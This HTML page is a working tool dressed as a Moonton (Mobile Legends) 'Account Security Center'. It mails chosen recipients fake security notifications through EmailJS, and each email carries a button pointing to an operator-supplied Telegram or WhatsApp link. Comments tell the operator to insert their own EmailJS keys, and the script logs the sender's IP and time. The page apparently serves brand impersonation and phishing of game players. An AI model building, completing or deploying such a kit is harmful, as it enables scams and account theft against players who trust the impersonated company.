<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pusat Keamanan Akun - Moonton</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function() {
            // GANTI DENGAN PUBLIC KEY EMAILJS ANDA
            emailjs.init("7rmzf-TOrWPeANPLM"); 
        })();
    </script>

    <style>
        :root {
            --primary-bg: #0a0e1b;
            --secondary-bg: #1a2238;
            --accent-gold: #f5d742;
            --accent-cyan: #00ffff;
            --text-light: #e0e0e0;
            --text-dark: #111;
            --border-color: #3a4a6e;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--primary-bg);
            color: var(--text-light);
            background-image: url('https://i.imgur.com/gKj3a8n.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 500px;
            background-color: rgba(26, 34, 56, 0.9);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 30px 40px;
            box-shadow: 0 8px 32px rgba(0, 255, 255, 0.2);
            backdrop-filter: blur(8px);
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: var(--accent-gold); font-size: 24px; font-weight: 700; text-transform: uppercase; }
        .header p { font-size: 14px; color: var(--text-light); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; color: var(--accent-cyan); }
        .form-group input { width: 100%; padding: 12px 15px; background-color: var(--primary-bg); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-light); font-size: 16px; transition: border-color 0.3s, box-shadow 0.3s; }
        .form-group input:focus { outline: none; border-color: var(--accent-cyan); box-shadow: 0 0 10px rgba(0, 255, 255, 0.3); }
        .submit-btn { width: 100%; padding: 14px; background: linear-gradient(90deg, var(--accent-cyan), #4d8aff); border: none; border-radius: 6px; color: var(--text-dark); font-size: 18px; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: transform 0.2s, box-shadow 0.3s; }
        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0, 255, 255, 0.4); }
        #status { text-align: center; margin-top: 20px; font-weight: 500; height: 20px; }
        .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #8892b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Pusat Keamanan Akun</h1>
            <p>Formulir Notifikasi Email</p>
        </div>
        <form id="mlbb-form">
            <div class="form-group">
                <label for="nickname">Nickname / ID</label>
                <input type="text" id="nickname" name="nickname" placeholder="Masukkan Nickname Penerima" required>
            </div>

            <div class="form-group">
                <label for="recipient_email">Email Penerima</label>
                <input type="email" id="recipient_email" name="recipient_email" placeholder="contoh@gmail.com" required>
            </div>

            <div class="form-group">
                <label for="button_link">Link Arah Tombol (Telegram/WhatsApp)</label>
                <input type="url" id="button_link" name="button_link" placeholder="https://t.me/username_anda" required>
            </div>

            <input type="hidden" name="user_ip">
            <input type="hidden" name="current_time">

            <button type="submit" class="submit-btn">Kirim Notifikasi</button>
            <div id="status"></div>
        </form>
        <div class="footer">
            Â© 2025 Moonton. All Rights Reserved.
        </div>
    </div>
    <script>
        async function enrichFormBeforeSend(form) {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                const now = new Date().toLocaleString("sv-SE", { timeZone: "Asia/Jakarta" });
                form.querySelector('input[name="user_ip"]').value = data.ip;
                form.querySelector('input[name="current_time"]').value = now;
            } catch (err) {
                console.error("Gagal mendapatkan IP atau waktu", err);
                const now = new Date().toLocaleString("sv-SE", { timeZone: "Asia/Jakarta" });
                form.querySelector('input[name="current_time"]').value = now;
            }
        }
        document.getElementById('mlbb-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            const form = this;
            const status = document.getElementById('status');
            const button = form.querySelector('.submit-btn');
            status.textContent = "Mengirim...";
            status.style.color = "var(--accent-gold)";
            button.disabled = true;
            await enrichFormBeforeSend(form);
            // GANTI DENGAN SERVICE ID & TEMPLATE ID ANDA
            emailjs.sendForm('service_5321oxq', 'template_lrq4jt9', form)
                .then(() => {
                    status.textContent = "Notifikasi berhasil dikirim!";
                    status.style.color = "var(--accent-cyan)";
                    form.reset();
                }, (err) => {
                    status.textContent = "Gagal mengirim. Coba lagi.";
                    status.style.color = "#ff4c4c";
                    console.error('FAILED...', err);
                })
                .finally(() => { button.disabled = false; });
        });
    </script>
</body>
</html>
